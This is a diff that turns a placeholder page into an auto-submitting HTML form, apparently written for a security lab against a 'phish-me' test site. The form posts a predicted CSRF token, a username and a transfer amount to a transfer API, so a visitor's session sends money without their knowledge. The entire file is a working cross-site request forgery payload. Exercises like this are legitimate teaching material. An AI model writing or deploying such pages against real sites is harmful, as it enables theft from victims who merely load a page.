@@ -1,1 +1,17 @@
-<h1>hello</h1>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Transfer</title>
+</head>
+<body>
+  <form id="autoTransferForm" method="POST" action="https://phish-me.quoccacorp.com/api/transfer">
+    <input type="hidden" name="csrf_token" value="MjY1MA=="> <!-- The most recent csrf_token you made noted from phish-me -->
+    <input type="hidden" name="username" value="z543XXXX"> <!-- Your username -->
+    <input type="hidden" name="amount" value="1000"> <!-- Set the amount you would like to transfer to yourself -->
+  </form>
+  <script>
+    document.getElementById("autoTransferForm").submit();
+  </script>
+</body>
+</html>
